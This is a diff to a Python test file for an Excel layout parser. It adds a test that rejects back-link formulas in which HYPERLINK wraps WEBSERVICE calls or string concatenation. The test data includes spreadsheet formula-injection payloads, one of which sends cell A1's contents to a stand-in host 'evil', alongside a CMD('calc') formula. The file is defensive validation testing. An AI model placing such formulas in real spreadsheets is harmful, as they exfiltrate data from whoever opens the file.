@@ -177,3 +177,16 @@ def test_back_link_formula_whitelist():
     for evil in ('=WEBSERVICE("http://evil")', '=CMD("calc")', 'HYPERLINK("x")'):
         with pytest.raises(ValueError, match="HYPERLINK"):
             parse_layout({"back_link": {"cell": "A1", "formula": evil}})
+
+
+def test_back_link_rejects_nested_function_formula():
+    """V-8 收口补丁（2026-09-03）：=HYPERLINK( 前缀内嵌 WEBSERVICE/& 拼接必须拒绝。"""
+    from excel.layout import parse_layout
+    evils = (
+        '=HYPERLINK(WEBSERVICE("http://evil/"&A1),"Go")',
+        '=HYPERLINK("#"&B1,"Go")',
+        '=HYPERLINK(IF(1,"#\'Content\'!A1","x"),"Go")',
+    )
+    for evil in evils:
+        with pytest.raises(ValueError, match="字面量"):
+            parse_layout({"back_link": {"cell": "A1", "formula": evil}})
